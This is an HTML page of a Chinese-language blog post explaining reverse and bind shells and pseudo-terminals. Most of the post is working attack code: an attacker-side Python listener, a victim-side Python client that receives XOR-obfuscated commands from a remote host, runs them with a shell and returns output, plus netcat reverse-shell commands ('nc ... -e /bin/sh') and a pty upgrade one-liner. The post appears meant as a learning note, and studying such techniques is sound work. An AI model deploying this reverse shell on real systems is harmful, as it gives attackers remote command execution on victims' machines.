@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html>
+<head>
+<link rel="shortcut icon" href="https://reticenceji.github.io/favicon.ico" type="image/x-icon" /><meta name="viewport"content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/><meta name="apple-mobile-web-app-capable"content="yes"/><meta name="apple-mobile-web-app-status-bar-style"content="black"/><meta name="format-detection"content="telephone=no"/><meta name="renderer"content="webkit"><meta name="description"content=""><meta charset="UTF-8"><title>反向Shell和伪终端 | Reticence</title>
+<link href="https://reticenceji.github.io/styles/main.css" type="text/css" rel="stylesheet" /><link href="https://at.alicdn.com/t/font_1621793_zatzzgvf30g.css" type="text/css" rel="stylesheet" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css"><script async src="https://cdn.jsdelivr.net/npm/busuanzi@2.3.0/bsz.pure.mini.min.js"></script><script src="https://reticenceji.github.io/media/js/magnify.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"></script>
+<script type="text/javascript">function btn_toggle(){document.getElementById("hn").classList.contains("no-js")?document.getElementById("hn").classList.remove("no-js"):document.getElementById("hn").classList.add("no-js")}</script>
+
+<link rel="canonical" href="https://reticenceji.github.io/post/fan-xiang-shell/" />
+</head>
+<body>
+<div class="progress"></div><style>.progress{background:linear-gradient(to right,#87ceeb var(--scroll),transparent 0);background-repeat:no-repeat;position:fixed;width:100%;height:4px;z-index:1}</style><div class="darkmode-background"></div><div class="darkmode-layer"></div>
+<noscript><p class="warn" >本页面需要浏览器支持（启用）JavaScript</p></noscript><div class="header"><div class="logo_title"><div class="title animated fadeInDown"><a href="https://reticenceji.github.io"><img alt="logo" style="display:inline-block;" src="https://reticenceji.github.io/images/avatar.png"/></a><h1 title="Reticence" class="weaklink"><a  href="/">Reticence</a></h1>
+
+<div class="navbar weaklink">
+<div class="normal_nav">
+<div class="bitcron_nav_container"><div class="bitcron_nav"><div class="bitcron_nav"><div style="display:flex;justify-content:center;"><nav class="mixed_site_nav_wrap site_nav_wrap"><ul class="mixed_site_nav site_nav sm sm-base">	<li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/" class="selected active current nav__item" >Index</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/tags" class="selected active current nav__item" >Tags</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/archives" class="selected active current nav__item" >Archives</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/navigator.html" class="selected active current nav__item" >Navigator</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/post/about" class="selected active current nav__item" >About</a></li></ul></nav>
+<div style="float:right;margin-top:1em"><form id="gridea-search-form" data-update="1578893743252" action="/search/index.html"><input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="Search..."></form></div><div style="margin-left:0.5em;margin-top:1.2em"><input id="switch_default" onclick="mobileBtn()" type="checkbox" class="switch_default"><label for="switch_default" class="toggleBtn"></label></div></div>
+<div class="clear clear_nav_inline_end"></div></div></div><div class="clear clear_nav_end"></div></div></div><div class="hamberger" href="javascript:void(0)" onclick="btn_toggle();"><i class="iconfont icon-category"></i></div></div></div></div>
+<div id="hn" class="no-js hidden_nav animated fadeInDown"><div class="bitcron_nav_container"><div class="bitcron_nav"><nav class="mixed_site_nav_wrap site_nav_wrap"><ul class="mixed_site_nav site_nav sm sm-base">	<li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/" class="selected active current nav__item" >Index</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/tags" class="selected active current nav__item" >Tags</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/archives" class="selected active current nav__item" >Archives</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/navigator.html" class="selected active current nav__item" >Navigator</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/post/about" class="selected active current nav__item" >About</a></li></ul><div class="clear clear_nav_inline_end"></div></nav></div><div class="clear clear_nav_end"></div></div>
+<div style="display:flex;justify-content:center;inline-block;text-align:center;margin-top:7%"><div><form id="gridea-search-form" data-update="1627835297708" action="/search/index.html"><input class="search-input" autocomplete="off" spellcheck="false" name="q"  placeholder="Search..." /></form></div><div style="margin-left:0.5em"><input id="switch_default_h" onclick="mobileBtn()" type="checkbox" class="switch_default"><label for="switch_default" class="toggleBtn"></label></div></div>
+</div></div>
+<script>function enableDarkmode(){document.body.classList.add("darkmode"),document.getElementById("switch_default").checked=1,document.getElementById("switch_default_h").checked=1}function removeDarkmode(){document.body.classList.remove("darkmode"),document.getElementById("switch_default").checked=0,document.getElementById("switch_default_h").checked=0}function getCookie(a){var b,c=new RegExp("(^| )"+a+"=([^;]*)(;|$)");return(b=document.cookie.match(c))?unescape(b[2]):null}cookie=getCookie("darkmode"),"enable"==cookie&&enableDarkmode(),window.matchMedia("(prefers-color-scheme: dark)").matches&&"disable"!==cookie&&(enableDarkmode(),document.cookie="darkmode=enable; path=/");var mobileBtn=function(){1==document.getElementById("switch_default").checked?(enableDarkmode(),document.cookie="darkmode=enable; path=/"):(removeDarkmode(),document.cookie="darkmode=disable; path=/")};</script>
+
+<div class="main"><div class="main-inner"><div class="content">
+<article class="post">
+<h2 class="post_title sm_margin"><a>反向Shell和伪终端</a></h2>
+<script>function lan(){if(document.getElementById("lan").innerText=="繁"){var s=document.getElementById("tongwenlet_cn");if(s!=null){document.body.removeChild(s)}var s=document.createElement("script");s.language="javascript";s.type="text/javascript";s.src="https://cdn.jsdelivr.net/gh/qyxtim/Static@1.1/bookmarklet_tw.js";s.id="tongwenlet_cn";document.body.appendChild(s);document.getElementById("lan").innerHTML="简"}else{if(document.getElementById("lan").innerText=="簡"){var s=document.getElementById("tongwenlet_cn");if(s!=null){document.body.removeChild(s)}var s=document.createElement("script");s.language="javascript";s.type="text/javascript";s.src="https://cdn.jsdelivr.net/gh/qyxtim/Static@1.1/bookmarklet_cn.js";s.id="tongwenlet_cn";document.body.appendChild(s);document.getElementById("lan").innerHTML="繁"}}};</script>
+<section class="post_details"><i class="iconfont icon-calendar"></i><span style="margin-right:15px"> 2020-11-20</span><i class="iconfont icon-browse"></i><span style="margin-right:15px"> <span id="busuanzi_value_page_pv"></span> Views</span><i class="iconfont icon-category"></i><span class="weaklink" style="margin-right:15px">	<a href="https://reticenceji.github.io/tag/i1ce0_J8S/" class="tag">Linux</a> | 	<a href="https://reticenceji.github.io/tag/F7-18Ec_H/" class="tag">Others</a></span><i class="iconfont icon-caret-down"></i><span style="margin-right:15px">766字</span><i class="iconfont icon-naozhong"></i><span style="margin-right:15px">4 min read</span><a id="lan" href="javascript:void(0);"onclick="lan();"title="调整简繁体" style="margin-right:15px;">繁</a>
+</section>
+
+<div style="display:flex">
+<div class="md_block" id="md_block">
+<div class="round-shape-one"></div>
+<p>参考链接：https://resources.infosecinstitute.com/topic/icmp-reverse-shell/#:~:text=A%20reverse%20shell%20is%20a,Bind%20shell</p>
+<p>Shell can simply be described as a piece of code or program which can be used to gain code or command execution on a device .<br>
+Shell可以简单的认为是一个可以执行用户命令的程序。</p>
+<h2 id="reverse-shell-and-bind-shell">Reverse shell and Bind shell</h2>
+<p>他们都是通过TCP连接的远程shell。<br>
+<img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110414_1037_ICMPReverse1.png" alt="" loading="lazy"></p>
+<center> Figure 1: Reverse TCP shell </center>
+<figure data-type="image" tabindex="1"><img src="https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110414_1037_ICMPReverse2.png" alt="" loading="lazy"></figure>
+<center> Figure 2: Bind TCP shell </center>
+<p>Bind TCP shell，比如我们ssh的远程连接。<br>
+Reverse TCP shell，我们直接来看一个demo。</p>
+<h2 id="反向shell-demo">反向shell demo</h2>
+<p>这是在攻击者上运行的脚本，一个简陋的shell环境。</p>
+<pre><code># 在attack上运行，作为一个服务器发送数据
+import socket 
+
+# 创建一个套接字。第一个参数表示使用IPV4，第二个参数表示创建一个TCP socket
+# https://docs.python.org/3/library/socket.html#socket.AF_INET
+# https://docs.python.org/3/library/socket.html#socket.SOCK_STREAM
+# 用with真香，不用close了
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+	# 将套接字绑定到 address。套接字必须尚未绑定。0.0.0.0是一个缺省的表述。
+	# port应该在1-65535，并且小于1024的需要权限
+	s.bind((&quot;0.0.0.0&quot;, 4431))
+	# 开启监听，1是连接的最大数量
+	s.listen(1)
+	print(&quot;Listening on port 4431... &quot;)
+	# accept blocks 并等待连接
+	# accept返回值为一个connection，以及client的地址。我们通过这个connection和client通信。
+	conn, client_addr = s.accept()
+	with conn:
+		print (&quot; Received connection from : &quot;, client_addr)
+		while True:
+			command = input('~$ ')
+			encode = bytearray(command,encoding=&quot;utf-8&quot;)
+			for i in range(len(encode)):
+				encode[i] ^=0x41
+			conn.sendall(encode)
+
+			en_data=conn.recv(1024)
+			decode = bytearray(en_data)
+			for i in range(len(decode)):
+				decode[i] ^=0x41
+			print(decode.decode(&quot;utf-8&quot;))
+</code></pre>
+<p>这是受害者上运行的脚本。</p>
+<pre><code>#在victim上运行,作为客户接受数据
+import socket,subprocess,sys
+
+RHOST = sys.argv[1]
+RPORT = 4431
+with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
+	s.connect((RHOST,RPORT))
+	while True:
+		# 从socket中接收XOR编码的数据
+		data = s.recv(1024)
+		en_data = bytearray(data)
+		for i in range(len(en_data)):
+			en_data[i] ^= 0x41
+		
+		# 执行解码命令，subprocess模块能够通过PIPE STDOUT/STDERR/STDIN把值赋值给一个变量
+		proc = subprocess.Popen(en_data.decode(&quot;utf-8&quot;), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+		try:
+			# 等待子进程结束
+			proc.wait(timeout=10)
+			STDOUT, STDERR = proc.communicate()
+		except:
+			proc.kill()
+			STDOUT = b''
+			STDERR = b&quot;[ERROR] Process do not terminate&quot;
+
+		# 输出编码后的数据并且发送给指定的主机RHOST
+		en_STDOUT = bytearray(STDOUT+STDERR)
+		if not en_STDOUT:
+			en_STDOUT = bytearray(b'\n')
+
+		for i in range(len(en_STDOUT)):
+			en_STDOUT[i] ^= 0x41
+		s.sendall(en_STDOUT)
+</code></pre>
+<h2 id="伪终端">伪终端</h2>
+<p>上面的反向shell的功能并不是很强大，因为输入输出都是通过管道进行，我们不能执行像vim这样的命令，特殊控制字符（比如<code>Ctrl+C</code>）也不能发送。其实我们只是模拟了一个简易的shell。<br>
+伪终端是命令终端(cmd.exe,/bin/sh)通过网络接口反弹给攻击者，或者是新建一个监听端口反弹一个终端给攻击者。（对应于正向和反向）</p>
+<pre><code>#启动netcat监听器
+~$ nc -lvp 443
+listening on [any] 443 ...
+ 
+# 使用netcat反弹'/bin/sh'
+~$ nc 127.0.0.1 443 -e /bin/sh
+
+#然后执行命令创建伪终端
+python -c &quot;import pty;pty.spawn(&quot;/bin/bash&quot;)&quot;
+</code></pre>
+
+<span id="footnote"></span>
+<div id = "warn"></div>
+</div>
+<div class="toc-container"><ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#reverse-shell-and-bind-shell">Reverse shell and Bind shell</a></li>
+<li><a href="#%E5%8F%8D%E5%90%91shell-demo">反向shell demo</a></li>
+<li><a href="#%E4%BC%AA%E7%BB%88%E7%AB%AF">伪终端</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+<div id="fullPage"><canvas id="canvas"></canvas></div>
+</article>
+<div id="eof"><span>EOF</span></div><div class="round-shape-one"></div>
+<section>
+<div class="doc_comments">
+
+</div></section>
+</div></div></div><script>
+"use strict";!function(){for(var n=document.getElementsByTagName("pre"),e=n.length,s=0;s<e;s++){n[s].innerHTML='<span class="line-number"></span>'+n[s].innerHTML+'<span class="cl"></span>';for(var a=n[s].innerHTML.split(/\n/).length,r=0;r<a-1;r++){n[s].getElementsByTagName("span")[0].innerHTML+="<span>"+(r+1)+"</span>"}}}();
+let mainNavLinks=document.querySelectorAll(".markdownIt-TOC a");window.addEventListener("scroll",event=>{let fromTop=window.scrollY;mainNavLinks.forEach((link,index)=>{let section=document.getElementById(decodeURI(link.hash).substring(1));let nextSection=null
+if(mainNavLinks[index+1]){nextSection=document.getElementById(decodeURI(mainNavLinks[index+1].hash).substring(1));}
+if(section.offsetTop<=fromTop){if(nextSection){if(nextSection.offsetTop>fromTop){link.classList.add("currentToc");}else{link.classList.remove("currentToc");}}else{link.classList.add("currentToc");}}else{link.classList.remove("currentToc");}});});
+var h=document.documentElement,b=document.body,st="scrollTop",sh="scrollHeight",progress=document.querySelector(".progress"),scroll;document.addEventListener("scroll",function(){scroll=(h[st]||b[st])/((h[sh]||b[sh])-h.clientHeight)*100;progress.style.setProperty("--scroll",scroll+"%")});
+var wxScale=new WxScale({fullPage:document.querySelector("#fullPage"),canvas:document.querySelector("#canvas")});var imgBox=document.querySelectorAll("#md_block img");for(var i=0;i<imgBox.length;i++){imgBox[i].onclick=function(e){wxScale.start(this)}};
+</script>
+<a id="scrollUp" href="#top" style="position: fixed; z-index: 2147483647; display: block;"></a><div class="footer animated fadeInDown"><div class="site_footer"><div class="mysocials"><div class="my_socials"><a href="https://github.com/reticenceji"title="github"><i class="iconfont icon-github"></i></a><a href="reticenceji@qq.com"title="envelope"><i class="iconfont icon-envelope"></i></a><a href="https://www.zhihu.com/people/reticenceji"title="zhihu"><i class="iconfont icon-zhihu"></i></a></div></div><div class="copyright"id="copyright">Copyright © 2018-2020 <a href="https://reticenceji.github.io" style="margin:0;">Reticence</a>.</div>
+<span style="display: inline;margin-right:15px;">👁<strong><span id="busuanzi_value_site_uv"></span></strong></span><span id="busuanzi_container_page_pv" style="display: inline;"><span>📚<strong>176</strong> posts</span></div></div>
+<script>
+console.log("\n %c \u26a1Theme: Bitcron-pro Author's Blog:https://blog.blinkstar.cn  Writen By Serence  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;", );
+</script>
+<script src="https://cdn.jsdelivr.net/npm/instant.page@3.0.0/instantpage.min.js" type="module" defer></script>
+<script type="text/javascript" async src="https://reticenceji.github.io/media/js/prism.js"></script>
+</body>
+</html>
